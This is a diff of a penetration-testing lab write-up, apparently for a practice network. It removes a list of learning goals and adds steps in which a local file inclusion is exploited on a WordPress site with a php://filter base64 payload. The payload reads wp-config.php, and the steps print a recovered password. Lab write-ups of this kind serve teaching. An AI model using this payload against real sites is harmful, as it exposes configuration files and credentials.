@@ -7,12 +7,6 @@
 
 ## Key Learnings
 
-- Become exposed to Tensorflow and exploiting h5 files
-- Use Docker to run python script
-- Doing local port forwarding to gain access to internal ports and services
-- Become more familiar with enumerating a Linux machine
-- Using Backrest commands to read sensitive files
-- The hacker mindset of exploiting a backup feature to read the root flag
 
 
 ## **Disclaimer: Potential spoilers below**
@@ -33,7 +27,7 @@ Host is up (0.067s latency).
 Nmap done: 256 IP addresses (2 hosts up) scanned in 2.47 seconds
 ```
 
-Discovered to hosts on the 10.10.110/24 network: .2 and .100
+Discovered 2 hosts on the 10.10.110/24 network: .2 and .100
 
 2. Do a full service scan of all ports for the 2 alive hosts
 
@@ -1327,4 +1321,13 @@ Nmap done: 10 IP addresses (10 hosts up) scanned in 946.96 seconds
 
 28. Indeed there is a LFI! However, since this is a PHP site, we won't be able to directly output the contents of any PHP Wordpress files. So we'll base64 encode it using PHP filters
 
-``
+`http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php`
+
+29. Copy paste the base64 string and decode it
+
+`echo [BASE64_STRING] | base64 -d > wp-config.php`
+
+30. Reading the contents of the `wp-config.php` file gives us margaret's password `Welcome1!2@3#`
+
+
+
